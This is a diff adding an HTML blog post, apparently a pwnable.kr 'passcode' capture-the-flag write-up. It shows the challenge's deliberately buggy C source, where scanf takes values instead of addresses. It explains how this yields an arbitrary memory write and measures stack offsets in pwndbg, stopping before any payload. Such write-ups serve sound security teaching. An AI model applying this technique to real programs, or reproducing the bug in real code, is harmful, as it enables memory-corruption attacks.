@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>passcode</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+    /* CSS for syntax highlighting */
+    html { -webkit-text-size-adjust: 100%; }
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        background-color: #232629;
+        color: #7a7c7d;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+    div.sourceCode
+      { color: #cfcfc2; background-color: #232629; }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span { color: #cfcfc2; } /* Normal */
+    code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+    code span.an { color: #3f8058; } /* Annotation */
+    code span.at { color: #2980b9; } /* Attribute */
+    code span.bn { color: #f67400; } /* BaseN */
+    code span.bu { color: #7f8c8d; } /* BuiltIn */
+    code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #3daee9; } /* Char */
+    code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+    code span.co { color: #7a7c7d; } /* Comment */
+    code span.cv { color: #7f8c8d; } /* CommentVar */
+    code span.do { color: #a43340; } /* Documentation */
+    code span.dt { color: #2980b9; } /* DataType */
+    code span.dv { color: #f67400; } /* DecVal */
+    code span.er { color: #da4453; text-decoration: underline; } /* Error */
+    code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+    code span.fl { color: #f67400; } /* Float */
+    code span.fu { color: #8e44ad; } /* Function */
+    code span.im { color: #27ae60; } /* Import */
+    code span.in { color: #c45b00; } /* Information */
+    code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+    code span.op { color: #cfcfc2; } /* Operator */
+    code span.ot { color: #27ae60; } /* Other */
+    code span.pp { color: #27ae60; } /* Preprocessor */
+    code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+    code span.sc { color: #3daee9; } /* SpecialChar */
+    code span.ss { color: #da4453; } /* SpecialString */
+    code span.st { color: #f44f4f; } /* String */
+    code span.va { color: #27aeae; } /* Variable */
+    code span.vs { color: #da4453; } /* VerbatimString */
+    code span.wa { color: #da4453; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+<header>
+    <h1>ethan grassia</h1>
+    <nav>
+        <a href="/">home</a>
+        <a href="/blog">blog</a>
+    </nav>
+    </header>
+    <hr>
+<p>04-27-2026 | <i>pwnable.kr series</i></p>
+<h1 id="passcode">passcode</h1>
+<p>this challenge is interesting because it involves a few different
+ideas that come together to make the exploit work. at first glance, it
+appears that the program just collects the user’s name with
+<code>welcome()</code> and runs a simple login routine to get two
+numeric passcodes, then compares them to some authentication values to
+get the flag. let’s run it and see what happens:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode numberSource c numberLines"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb1-3"><a href="#cb1-3"></a></span>
+<span id="cb1-4"><a href="#cb1-4"></a><span class="dt">void</span> login<span class="op">(){</span></span>
+<span id="cb1-5"><a href="#cb1-5"></a>    <span class="dt">int</span> passcode1<span class="op">;</span></span>
+<span id="cb1-6"><a href="#cb1-6"></a>    <span class="dt">int</span> passcode2<span class="op">;</span></span>
+<span id="cb1-7"><a href="#cb1-7"></a></span>
+<span id="cb1-8"><a href="#cb1-8"></a>    printf<span class="op">(</span><span class="st">&quot;enter passcode1 : &quot;</span><span class="op">);</span></span>
+<span id="cb1-9"><a href="#cb1-9"></a>    scanf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%d</span><span class="st">&quot;</span><span class="op">,</span> passcode1<span class="op">);</span></span>
+<span id="cb1-10"><a href="#cb1-10"></a>    fflush<span class="op">(</span>stdin<span class="op">);</span></span>
+<span id="cb1-11"><a href="#cb1-11"></a></span>
+<span id="cb1-12"><a href="#cb1-12"></a>    <span class="co">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span>
+<span id="cb1-13"><a href="#cb1-13"></a>    printf<span class="op">(</span><span class="st">&quot;enter passcode2 : &quot;</span><span class="op">);</span></span>
+<span id="cb1-14"><a href="#cb1-14"></a>        scanf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%d</span><span class="st">&quot;</span><span class="op">,</span> passcode2<span class="op">);</span></span>
+<span id="cb1-15"><a href="#cb1-15"></a></span>
+<span id="cb1-16"><a href="#cb1-16"></a>    printf<span class="op">(</span><span class="st">&quot;checking...</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-17"><a href="#cb1-17"></a>    <span class="cf">if</span><span class="op">(</span>passcode1<span class="op">==</span><span class="dv">123456</span> <span class="op">&amp;&amp;</span> passcode2<span class="op">==</span><span class="dv">13371337</span><span class="op">){</span></span>
+<span id="cb1-18"><a href="#cb1-18"></a>                printf<span class="op">(</span><span class="st">&quot;Login OK!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-19"><a href="#cb1-19"></a>        setregid<span class="op">(</span>getegid<span class="op">(),</span> getegid<span class="op">());</span></span>
+<span id="cb1-20"><a href="#cb1-20"></a>                system<span class="op">(</span><span class="st">&quot;/bin/cat flag&quot;</span><span class="op">);</span></span>
+<span id="cb1-21"><a href="#cb1-21"></a>        <span class="op">}</span></span>
+<span id="cb1-22"><a href="#cb1-22"></a>        <span class="cf">else</span><span class="op">{</span></span>
+<span id="cb1-23"><a href="#cb1-23"></a>                printf<span class="op">(</span><span class="st">&quot;Login Failed!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-24"><a href="#cb1-24"></a>        exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb1-25"><a href="#cb1-25"></a>        <span class="op">}</span></span>
+<span id="cb1-26"><a href="#cb1-26"></a><span class="op">}</span></span>
+<span id="cb1-27"><a href="#cb1-27"></a></span>
+<span id="cb1-28"><a href="#cb1-28"></a><span class="dt">void</span> welcome<span class="op">(){</span></span>
+<span id="cb1-29"><a href="#cb1-29"></a>    <span class="dt">char</span> name<span class="op">[</span><span class="dv">100</span><span class="op">];</span></span>
+<span id="cb1-30"><a href="#cb1-30"></a>    printf<span class="op">(</span><span class="st">&quot;enter you name : &quot;</span><span class="op">);</span></span>
+<span id="cb1-31"><a href="#cb1-31"></a>    scanf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%100s</span><span class="st">&quot;</span><span class="op">,</span> name<span class="op">);</span></span>
+<span id="cb1-32"><a href="#cb1-32"></a>    printf<span class="op">(</span><span class="st">&quot;Welcome </span><span class="sc">%s</span><span class="st">!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> name<span class="op">);</span></span>
+<span id="cb1-33"><a href="#cb1-33"></a><span class="op">}</span></span>
+<span id="cb1-34"><a href="#cb1-34"></a></span>
+<span id="cb1-35"><a href="#cb1-35"></a><span class="dt">int</span> main<span class="op">(){</span></span>
+<span id="cb1-36"><a href="#cb1-36"></a>    printf<span class="op">(</span><span class="st">&quot;Toddler&#39;s Secure Login System 1.1 beta.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-37"><a href="#cb1-37"></a></span>
+<span id="cb1-38"><a href="#cb1-38"></a>    welcome<span class="op">();</span></span>
+<span id="cb1-39"><a href="#cb1-39"></a>    login<span class="op">();</span></span>
+<span id="cb1-40"><a href="#cb1-40"></a></span>
+<span id="cb1-41"><a href="#cb1-41"></a>    <span class="co">// something after login...</span></span>
+<span id="cb1-42"><a href="#cb1-42"></a>    printf<span class="op">(</span><span class="st">&quot;Now I can safely trust you that you have credential :)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-43"><a href="#cb1-43"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span>   </span>
+<span id="cb1-44"><a href="#cb1-44"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>passcode@ubuntu:~$ ./passcode</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>Toddler&#39;s Secure Login System 1.1 beta.</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>enter you name : ethan</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>Welcome ethan!</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>enter passcode1 : 123</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>enter passcode2 : 456</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>Segmentation fault (core dumped)</span></code></pre></div>
+<p>segmentation fault. looks like the <code>456</code> we wrote to
+<code>passcode2</code> ended up somewhere it shouldn’t have in memory.
+taking a closer a look, we can see that the problem lies in the usage of
+<code>scanf()</code> on lines 9 and 14—the variables passed should be
+referenced with the address-of operator (<code>&amp;passcode1</code>)
+because <code>scanf()</code> expects an address to write the formatted
+data to. instead, the int literal is erroneously passed and causes
+<code>passcode1</code>’s uninitialized data to be interpreted as if it
+were an address. this not only causes the segfault but also creates a
+more serious issue: if there were some way to control the value of
+<code>passcode1</code> before the bug, then <code>scanf()</code> would
+allow an arbitrary write in memory. for example:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> passcode1<span class="op">;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>passcode1 <span class="op">=</span> <span class="bn">0xdeadbeef</span><span class="op">;</span> <span class="co">// pretend that we control this value</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>printf<span class="op">(</span><span class="st">&quot;enter passcode1 : &quot;</span><span class="op">);</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>scanf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%d</span><span class="st">&quot;</span><span class="op">,</span> passcode1<span class="op">);</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="co">// prompt user input</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="co">// choose any value to write to 0xdeadbeef</span></span></code></pre></div>
+<p>the only array in the program lives in <code>welcome()</code> and
+doesn’t appear to have overflow potential since it controls input size
+with <code>%100s</code> (100 field width, string format). however,
+<code>welcome()</code> and <code>login()</code> sit right next to each
+other in <code>main()</code>. let’s see what happens if we take the
+offset between <code>name[]</code> and <code>passcode1</code>:</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; disass welcome</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>Dump of assembler code for function welcome:</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>   0x080492f2 &lt;+0&gt;: push   ebp</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>   0x080492f3 &lt;+1&gt;: mov    ebp,esp</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>   0x080492f5 &lt;+3&gt;: push   ebx</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>   0x080492f6 &lt;+4&gt;: sub    esp,0x74</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>   0x080492f9 &lt;+7&gt;: call   0x8049130 <span class="dt">&lt;</span><span class="kw">__x86.get_pc_thunk.bx</span><span class="dt">&gt;</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>   0x080492fe &lt;+12&gt;:    add    ebx,0x2d02</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>   0x08049304 &lt;+18&gt;:    mov    eax,gs:0x14</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>   0x0804930a &lt;+24&gt;:    mov    DWORD PTR <span class="co">[</span><span class="ot">ebp-0xc</span><span class="co">]</span>,eax</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>   0x0804930d &lt;+27&gt;:    xor    eax,eax</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>   0x0804930f &lt;+29&gt;:    sub    esp,0xc</span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>   0x08049312 &lt;+32&gt;:    lea    eax,<span class="co">[</span><span class="ot">ebx-0x1f9d</span><span class="co">]</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>   0x08049318 &lt;+38&gt;:    push   eax</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>   0x08049319 &lt;+39&gt;:    call   0x8049050 &lt;printf@plt&gt;</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>   0x0804931e &lt;+44&gt;:    add    esp,0x10</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>   0x08049321 &lt;+47&gt;:    sub    esp,0x8</span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>   0x08049324 &lt;+50&gt;:    lea    eax,<span class="co">[</span><span class="ot">ebp-0x70</span><span class="co">]</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>   0x08049327 &lt;+53&gt;:    push   eax</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>   0x08049328 &lt;+54&gt;:    lea    eax,<span class="co">[</span><span class="ot">ebx-0x1f8b</span><span class="co">]</span></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>   0x0804932e &lt;+60&gt;:    push   eax</span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>   0x0804932f &lt;+61&gt;:    call   0x80490d0 &lt;__isoc99_scanf@plt&gt;</span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>   0x08049334 &lt;+66&gt;:    add    esp,0x10</span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>   0x08049337 &lt;+69&gt;:    sub    esp,0x8</span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a>   0x0804933a &lt;+72&gt;:    lea    eax,<span class="co">[</span><span class="ot">ebp-0x70</span><span class="co">]</span></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>   0x0804933d &lt;+75&gt;:    push   eax</span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>   0x0804933e &lt;+76&gt;:    lea    eax,<span class="co">[</span><span class="ot">ebx-0x1f85</span><span class="co">]</span></span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>   0x08049344 &lt;+82&gt;:    push   eax</span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>   0x08049345 &lt;+83&gt;:    call   0x8049050 &lt;printf@plt&gt;</span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>   0x0804934a &lt;+88&gt;:    add    esp,0x10</span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>   0x0804934d &lt;+91&gt;:    nop</span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>   0x0804934e &lt;+92&gt;:    mov    eax,DWORD PTR <span class="co">[</span><span class="ot">ebp-0xc</span><span class="co">]</span></span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>   0x08049351 &lt;+95&gt;:    sub    eax,DWORD PTR gs:0x14</span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>   0x08049358 &lt;+102&gt;:   je     0x804935f &lt;welcome+109&gt;</span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a>   0x0804935a &lt;+104&gt;:   call   0x80493c0 <span class="dt">&lt;</span><span class="kw">__stack_chk_fail_local</span><span class="dt">&gt;</span></span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a>   0x0804935f &lt;+109&gt;:   mov    ebx,DWORD PTR <span class="co">[</span><span class="ot">ebp-0x4</span><span class="co">]</span></span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a>   0x08049362 &lt;+112&gt;:   leave</span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a>   0x08049363 &lt;+113&gt;:   ret</span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a>End of assembler dump.</span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; b *welcome + 112</span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a>Breakpoint 1 at 0x8049362</span>
+<span id="cb4-42"><a href="#cb4-42" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; r</span>
+<span id="cb4-43"><a href="#cb4-43" aria-hidden="true" tabindex="-1"></a>Starting program: /home/passcode/passcode</span>
+<span id="cb4-44"><a href="#cb4-44" aria-hidden="true" tabindex="-1"></a><span class="co">[</span><span class="ot">Thread debugging using libthread_db enabled</span><span class="co">]</span></span>
+<span id="cb4-45"><a href="#cb4-45" aria-hidden="true" tabindex="-1"></a>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span>
+<span id="cb4-46"><a href="#cb4-46" aria-hidden="true" tabindex="-1"></a>Toddler&#39;s Secure Login System 1.1 beta.</span>
+<span id="cb4-47"><a href="#cb4-47" aria-hidden="true" tabindex="-1"></a>enter you name : AAAAAAAA</span>
+<span id="cb4-48"><a href="#cb4-48" aria-hidden="true" tabindex="-1"></a>Welcome AAAAAAAA!</span>
+<span id="cb4-49"><a href="#cb4-49" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-50"><a href="#cb4-50" aria-hidden="true" tabindex="-1"></a>Breakpoint 1, 0x08049362 in welcome ()</span>
+<span id="cb4-51"><a href="#cb4-51" aria-hidden="true" tabindex="-1"></a>Disabling the emulation via Unicorn Engine that is used for computing branches as there isn&#39;t enough memory (1GB) to use it (since mmap(1G, RWX) failed). See also:</span>
+<span id="cb4-52"><a href="#cb4-52" aria-hidden="true" tabindex="-1"></a><span class="ss">* </span>https://github.com/pwndbg/pwndbg/issues/1534</span>
+<span id="cb4-53"><a href="#cb4-53" aria-hidden="true" tabindex="-1"></a><span class="ss">* </span>https://github.com/unicorn-engine/unicorn/pull/1743</span>
+<span id="cb4-54"><a href="#cb4-54" aria-hidden="true" tabindex="-1"></a>Either free your memory or explicitly set <span class="in">`set emulate off`</span> in your Pwndbg config</span>
+<span id="cb4-55"><a href="#cb4-55" aria-hidden="true" tabindex="-1"></a>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span>
+<span id="cb4-56"><a href="#cb4-56" aria-hidden="true" tabindex="-1"></a>──────────────────────────────<span class="co">[</span><span class="ot"> REGISTERS / show-flags off / show-compact-regs off </span><span class="co">]</span>──────────────────────────────</span>
+<span id="cb4-57"><a href="#cb4-57" aria-hidden="true" tabindex="-1"></a> EAX  0</span>
+<span id="cb4-58"><a href="#cb4-58" aria-hidden="true" tabindex="-1"></a> EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1</span>
+<span id="cb4-59"><a href="#cb4-59" aria-hidden="true" tabindex="-1"></a> ECX  0</span>
+<span id="cb4-60"><a href="#cb4-60" aria-hidden="true" tabindex="-1"></a> EDX  0</span>
+<span id="cb4-61"><a href="#cb4-61" aria-hidden="true" tabindex="-1"></a> EDI  0xf7fd6b80 (_rtld_global_ro) ◂— 0</span>
+<span id="cb4-62"><a href="#cb4-62" aria-hidden="true" tabindex="-1"></a> ESI  0xffad9874 —▸ 0xffadad62 ◂— &#39;/home/passcode/passcode&#39;</span>
+<span id="cb4-63"><a href="#cb4-63" aria-hidden="true" tabindex="-1"></a> EBP  0xffad9798 —▸ 0xffad97a8 —▸ 0xf7fd7020 (_rtld_global) —▸ 0xf7fd7a40 ◂— 0</span>
+<span id="cb4-64"><a href="#cb4-64" aria-hidden="true" tabindex="-1"></a> ESP  0xffad9720 —▸ 0xf7f81da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84</span>
+<span id="cb4-65"><a href="#cb4-65" aria-hidden="true" tabindex="-1"></a> EIP  0x8049362 (welcome+112) ◂— leave</span>
+<span id="cb4-66"><a href="#cb4-66" aria-hidden="true" tabindex="-1"></a>───────────────────────────────────────<span class="co">[</span><span class="ot"> DISASM / i386 / set emulate off </span><span class="co">]</span>────────────────────────────────────────</span>
+<span id="cb4-67"><a href="#cb4-67" aria-hidden="true" tabindex="-1"></a> ► 0x8049362 &lt;welcome+112&gt;    leave</span>
+<span id="cb4-68"><a href="#cb4-68" aria-hidden="true" tabindex="-1"></a>   0x8049363 &lt;welcome+113&gt;    ret</span>
+<span id="cb4-69"><a href="#cb4-69" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-70"><a href="#cb4-70" aria-hidden="true" tabindex="-1"></a>   0x8049364 <span class="dt">&lt;</span><span class="kw">main</span><span class="dt">&gt;</span>           lea    ecx, <span class="co">[</span><span class="ot">esp + 4</span><span class="co">]</span></span>
+<span id="cb4-71"><a href="#cb4-71" aria-hidden="true" tabindex="-1"></a>   0x8049368 &lt;main+4&gt;         and    esp, 0xfffffff0</span>
+<span id="cb4-72"><a href="#cb4-72" aria-hidden="true" tabindex="-1"></a>   0x804936b &lt;main+7&gt;         push   dword ptr <span class="co">[</span><span class="ot">ecx - 4</span><span class="co">]</span></span>
+<span id="cb4-73"><a href="#cb4-73" aria-hidden="true" tabindex="-1"></a>   0x804936e &lt;main+10&gt;        push   ebp</span>
+<span id="cb4-74"><a href="#cb4-74" aria-hidden="true" tabindex="-1"></a>   0x804936f &lt;main+11&gt;        mov    ebp, esp</span>
+<span id="cb4-75"><a href="#cb4-75" aria-hidden="true" tabindex="-1"></a>   0x8049371 &lt;main+13&gt;        push   ebx</span>
+<span id="cb4-76"><a href="#cb4-76" aria-hidden="true" tabindex="-1"></a>   0x8049372 &lt;main+14&gt;        push   ecx</span>
+<span id="cb4-77"><a href="#cb4-77" aria-hidden="true" tabindex="-1"></a>   0x8049373 &lt;main+15&gt;        call   __x86.get_pc_thunk.bx       &lt;__x86.get_pc_thunk.bx&gt;</span>
+<span id="cb4-78"><a href="#cb4-78" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-79"><a href="#cb4-79" aria-hidden="true" tabindex="-1"></a>   0x8049378 &lt;main+20&gt;        add    ebx, 0x2c88</span>
+<span id="cb4-80"><a href="#cb4-80" aria-hidden="true" tabindex="-1"></a>────────────────────────────────────────────────────<span class="co">[</span><span class="ot"> STACK </span><span class="co">]</span>─────────────────────────────────────────────────────</span>
+<span id="cb4-81"><a href="#cb4-81" aria-hidden="true" tabindex="-1"></a>00:0000│ esp 0xffad9720 —▸ 0xf7f81da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84</span>
+<span id="cb4-82"><a href="#cb4-82" aria-hidden="true" tabindex="-1"></a>01:0004│-074 0xffad9724 —▸ 0x99631a0 ◂— &#39;Welcome AAAAAAAA!\nogin System 1.1 beta.\n&#39;</span>
+<span id="cb4-83"><a href="#cb4-83" aria-hidden="true" tabindex="-1"></a>02:0008│-070 0xffad9728 ◂— &#39;AAAAAAAA&#39;</span>
+<span id="cb4-84"><a href="#cb4-84" aria-hidden="true" tabindex="-1"></a>03:000c│-06c 0xffad972c ◂— &#39;AAAA&#39;</span>
+<span id="cb4-85"><a href="#cb4-85" aria-hidden="true" tabindex="-1"></a>04:0010│-068 0xffad9730 ◂— 0</span>
+<span id="cb4-86"><a href="#cb4-86" aria-hidden="true" tabindex="-1"></a>05:0014│-064 0xffad9734 ◂— 0x28 /* &#39;(&#39; */</span>
+<span id="cb4-87"><a href="#cb4-87" aria-hidden="true" tabindex="-1"></a>06:0018│-060 0xffad9738 —▸ 0xf7dd649d (__overflow+13) ◂— add ebx, 0x1aab63</span>
+<span id="cb4-88"><a href="#cb4-88" aria-hidden="true" tabindex="-1"></a>07:001c│-05c 0xffad973c —▸ 0xf7f7fa60 (_IO_file_jumps) ◂— 0</span>
+<span id="cb4-89"><a href="#cb4-89" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────<span class="co">[</span><span class="ot"> BACKTRACE </span><span class="co">]</span>───────────────────────────────────────────────────</span>
+<span id="cb4-90"><a href="#cb4-90" aria-hidden="true" tabindex="-1"></a> ► 0 0x8049362 welcome+112</span>
+<span id="cb4-91"><a href="#cb4-91" aria-hidden="true" tabindex="-1"></a>   1 0x8049395 main+49</span>
+<span id="cb4-92"><a href="#cb4-92" aria-hidden="true" tabindex="-1"></a>   2 0xf7d78519 __libc_start_call_main+121</span>
+<span id="cb4-93"><a href="#cb4-93" aria-hidden="true" tabindex="-1"></a>   3 0xf7d785f3 __libc_start_main+147</span>
+<span id="cb4-94"><a href="#cb4-94" aria-hidden="true" tabindex="-1"></a>   4 0x804910c _start+44</span>
+<span id="cb4-95"><a href="#cb4-95" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb4-96"><a href="#cb4-96" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; x/32xw $esp</span>
+<span id="cb4-97"><a href="#cb4-97" aria-hidden="true" tabindex="-1"></a>0xffad9720: 0xf7f81da0  0x099631a0  0x41414141  0x41414141</span>
+<span id="cb4-98"><a href="#cb4-98" aria-hidden="true" tabindex="-1"></a>0xffad9730: 0x00000000  0x00000028  0xf7dd649d  0xf7f7fa60</span>
+<span id="cb4-99"><a href="#cb4-99" aria-hidden="true" tabindex="-1"></a>0xffad9740: 0xf7f81da0  0xf7f81000  0xffad9788  0xf7dca42b</span>
+<span id="cb4-100"><a href="#cb4-100" aria-hidden="true" tabindex="-1"></a>0xffad9750: 0xf7f81da0  0x0000000a  0x00000027  0xffad98d8</span>
+<span id="cb4-101"><a href="#cb4-101" aria-hidden="true" tabindex="-1"></a>0xffad9760: 0x00000000  0x000007d4  0xf7f81e3c  0x00000027</span>
+<span id="cb4-102"><a href="#cb4-102" aria-hidden="true" tabindex="-1"></a>0xffad9770: 0xffad97a8  0xf7fb3004  0xffad97e0  0x0804c000</span>
+<span id="cb4-103"><a href="#cb4-103" aria-hidden="true" tabindex="-1"></a>0xffad9780: 0xffad9874  0xf7fd6b80  0xffad97a8  0x3ef8a600</span>
+<span id="cb4-104"><a href="#cb4-104" aria-hidden="true" tabindex="-1"></a>0xffad9790: 0x0804a088  0x0804c000  0xffad97a8  0x08049395</span>
+<span id="cb4-105"><a href="#cb4-105" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; p 0xffad9728</span>
+<span id="cb4-106"><a href="#cb4-106" aria-hidden="true" tabindex="-1"></a>$1 = 4289566504</span>
